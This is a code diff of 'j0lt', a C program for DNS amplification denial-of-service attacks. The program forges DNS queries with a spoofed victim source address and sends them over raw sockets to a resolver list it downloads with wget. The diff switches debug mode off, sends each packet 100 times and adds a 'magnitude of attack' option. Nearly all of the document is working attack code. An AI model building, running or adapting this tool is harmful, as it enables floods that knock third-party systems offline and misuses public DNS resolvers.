@@ -1,4 +1,4 @@
-/* PRIVATE CONFIDENTIAL SOURCE MATERIALS DO NOT DISTRIBUTE.
+/*    PRIVATE CONFIDENTIAL SOURCE MATERIALS DO NOT DISTRIBUTE
  *      _________  .__   __
  *     |__\   _  \ |  |_/  |_
  *     |  /  /_\  \|  |\   __\
@@ -17,7 +17,7 @@
  * https://www.rfc-editor.org/rfc/rfc768.html       (UDP)
  * https://www.rfc-editor.org/rfc/rfc760            (IP)
  * ------------------------------------------------------------
- * > Usage: sudo ./j0lt <target> <port> <num-packets>
+ * > Usage: sudo ./j0lt -t <target> -p <port> -m <magnitude>
  * (the-scientist㉿rs)-[~/0day]$ gcc j0lt.c -o j0lt
  * (the-scientist㉿rs)-[~/0day]$ unshare -rn
  * (the-scientist㉿rs)-[~/0day]# ./j0lt 127.0.0.1 80 1337
@@ -30,7 +30,7 @@
  * be the target’s address. When the DNS server sends the
  * record response, it is sent to the target instead.
  * ------------------------------------------------------------
- * > The only sane place left on the internet:
+ * > The only sane place left on the internet
  * irc.efnet.org #c
  */
 
@@ -69,7 +69,7 @@ const char* g_ansi = {
     "░░░░░░░░░░░░░░        ░ ░░░░░░░░░░░                                        \n"
     "░░░░░░░░░░░░░        ░░░░░░░░░░░░░-d <dst>        : target IPv4 (spoof)    \n"
     "░░░░░░░░░░░▓       ▒░░░░░░░░░░░░░ -p <port>       : target port            \n"
-    "░░░░░░░░░░▒      ░░░░░░░░░░░░░░░░ -n <num>        : num UDP packets to send\n"
+    "░░░░░░░░░░▒      ░░░░░░░░░░░░░░░░ -m <magnitude>  : magnitude of attack    \n"
     "░░░░░░░░░       ░░░░░░░░░░░░░░░░░                                          \n"
     "░░░░░░░░░     ░░░░░░░░░░░░░░░░░░░                                          \n"
     "░░░░░░░     ▒░░░░░░░░░░░░░░░░░░░░                                          \n"
@@ -89,9 +89,11 @@ const char* g_ansi = {
 #include <stdlib.h>
 #include <limits.h>
 #include <errno.h> 
+#include <ctype.h>
 
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/wait.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
@@ -205,17 +207,12 @@ DEFINE_INSERT_FN(qword, uint64_t)
 #define     DNS_ARCOUNT_J0LT 0x0000 // num additional RRs
 // END HEADER VALUES
 
-// START SYSTEM() AND READ() 
-#define     MAXREAD_J0LT 0x30
-#define     NCOMMANDS_J0LT 3
-#define     COMMAND_PATH_J0LT 0
-#define     COMMAND_RM_J0LT 1
-#define     COMMAND_WGET_J0LT 2
-
-const char* g_commands[ NCOMMANDS_J0LT ] = {
-    "/tmp/resolv.txt",
-    "rm /tmp/resolv.txt",
-    "wget -O /tmp/resolv.txt https://raw.githubusercontent.com/thesc1entist/j0lt/main/j0lt-resolv.txt"
+#define     MAX_LINE_SZ_J0LT 0x30
+const char* g_path = "/tmp/resolv.txt";
+char* g_wget[ ] = {
+    "/bin/wget", "-O", "/tmp/resolv.txt",
+    "https://raw.githubusercontent.com/thesc1entist/j0lt/main/j0lt-resolv.txt",
+    NULL
 };
 // END SYSTEM() AND READ() 
 
@@ -236,35 +233,31 @@ PackDNSHeader(DNSHEADER* dnshdr);
 void
 PackUDPHeader(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, uint16_t spoofport, size_t nwritten);
 void
-PackIPHeader(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, uint32_t resolvip, uint32_t spoofip, size_t nwritten, size_t udpsz);
+PackIPHeadr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, uint32_t resolvip, uint32_t spoofip, size_t nwritten, size_t udpsz);
 bool
 InsertData(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
 uint16_t
 CheckSum(const uint16_t* addr, size_t count);
-bool
+void
 SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten);
 void
 PrintHex(void* data, size_t len);
 size_t
 ForgeJ0ltPacket(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport);
-void
-Red(void);
-void
-Green(void);
-void
-Reset(void);
 
-#define DEBUG 1
+#define DEBUG 0
 int
 main(int argc, char** argv)
 {
     FILE* fptr;
-    char payload[ NS_PACKETSZ ], lineptr[ MAXREAD_J0LT ];
-    size_t szpayload, nread;
+    char payload[ NS_PACKETSZ ], lineptr[ MAX_LINE_SZ_J0LT ];
+    int status;
+    size_t szpayload, nread, szpewpew;
     uint32_t spoofip, resolvip;
     uint16_t spoofport, attacksz;
+    pid_t pid;
 
-    // TODO add optargs
+    printf("%s", g_ansi);
     if (argc != 4)
         goto fail_state;
 
@@ -272,69 +265,71 @@ main(int argc, char** argv)
     if (spoofip == 0)
         goto fail_state;
 
-    spoofip = htonl(spoofip);
-
     errno = 0;
     spoofport = ( uint16_t ) strtol(argv[ 2 ], NULL, 0); // port to victim
     attacksz = ( uint16_t ) strtol(argv[ 3 ], NULL, 0); // size of attack.
     if (errno != 0)
         goto fail_state;
 
-    system(g_commands[ COMMAND_WGET_J0LT ]); // grab resolv list
-    fptr = fopen(g_commands[ COMMAND_PATH_J0LT ], "r");
+    if ((pid = fork( )) < 0) {
+        printf("forking child process failed\n");
+        _exit(EXIT_FAILURE);
+    }
+    else if (pid == 0) {
+        if (execv(*g_wget, g_wget) < 0) {
+            printf("exec failed\n");
+            _exit(EXIT_FAILURE);
+        }
+    }
+    else {
+        while (wait(&status) != pid)
+            ;
+    }
+
+    printf("+ resolv list saved to %s\n", g_path);
+
+    fptr = fopen(g_path, "r");
     if (fptr == NULL)
         goto fail_state;
 
-    Green( );
-    printf("+ resolv list saved to %s\n", g_commands[ COMMAND_PATH_J0LT ]);
-    Reset( );
     while (attacksz >= 1) {
-        Green( );
         printf("+ current attack size %d \n", attacksz);
-        Reset( );
-        while (fgets(lineptr, MAXREAD_J0LT, fptr) != NULL) {
-            if (lineptr[ 0 ] == '#')
+        while (fgets(lineptr, MAX_LINE_SZ_J0LT, fptr) != NULL) {
+            if (!isdigit(lineptr[ 0 ]))
                 continue;
             nread = strlen(lineptr);
             lineptr[ nread - 1 ] = '\0';
-
             resolvip = inet_addr(lineptr);
             if (resolvip == 0)
                 continue;
-            resolvip = htonl(resolvip);
-
-            szpayload = ForgeJ0ltPacket(payload, resolvip, spoofip, spoofport);
-#if !DEBUG
-            if (SendPayload(payload, resolvip, NS_DEFAULTPORT, szpayload) == false)
-                goto fail_state;
+            szpewpew = 100;
+            szpayload = ForgeJ0ltPacket(payload, htonl(resolvip), htonl(spoofip), spoofport);
+#if !DEBUG  
+            while (szpewpew-- > 0) {
+                SendPayload(payload, resolvip, htons(NS_DEFAULTPORT), szpayload);
+            }
 #else 
             PrintHex(payload, szpayload);
 #endif
-        } // END INNER LOOP 
+        }
         attacksz--;
         rewind(fptr);
-    } // END OUTER LOOP
+    }
 
-    Red( );
-    printf("- removing resolv list from %s\n", g_commands[ COMMAND_PATH_J0LT ]);
-    Reset( );
-    system(g_commands[ COMMAND_RM_J0LT ]); // remove resolv list
-
+    remove(g_path);
     fclose(fptr);
 
     return 0;
 fail_state:
-    printf("%s", g_ansi);
     perror("error");
     exit(EXIT_FAILURE);
-} // END MAIN
+}
 
 
 size_t
 ForgeJ0ltPacket(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport)
 {
-    const char* url = ".";  // . is for the biggest possible payload 
-                            // Note: can be swapped for a list of urls
+    const char* url = ".";
     uint8_t pktbuf[ NS_PACKETSZ ], datagram[ NS_PACKETSZ ];
     uint8_t* curpos;
     size_t buflen, nwritten, szdatagram;
@@ -395,7 +390,7 @@ PrintHex(void* data, size_t len)
 }
 
 
-bool
+void
 SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten)
 {
     int raw_sockfd;
@@ -403,25 +398,25 @@ SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t n
     struct sockaddr_in addr;
 
     raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (raw_sockfd == -1)
-        return false;
+    if (raw_sockfd == -1) {
+        perror("fatal socket error");
+        exit(EXIT_FAILURE);
+    }
 
     addr.sin_family = AF_INET;
     addr.sin_port = uh_dport;
     addr.sin_addr.s_addr = daddr;
 
     nread = sendto(
-            raw_sockfd,
-            datagram,
-            nwritten,
-            0,
-            ( const struct sockaddr* ) &addr,
-            sizeof(addr)
+                raw_sockfd,
+                datagram,
+                nwritten,
+                0,
+                ( const struct sockaddr* ) &addr,
+                sizeof(addr)
     );
 
     close(raw_sockfd);
-
-    return !(nread == -1 || nread != nwritten);
 }
 
 
@@ -659,22 +654,4 @@ CheckSum(const uint16_t* addr, size_t count)
         sum = (sum & 0xffff) + (sum >> 16);
 
     return ~(( uint16_t ) ((sum << 8) | (sum >> 8)));
-}
-
-void
-Red(void)
-{
-    printf("\033[1;31m");
-}
-
-void
-Green(void)
-{
-    printf("\033[0;32m");
-}
-
-void
-Reset(void)
-{
-    printf("\033[0m");
 }
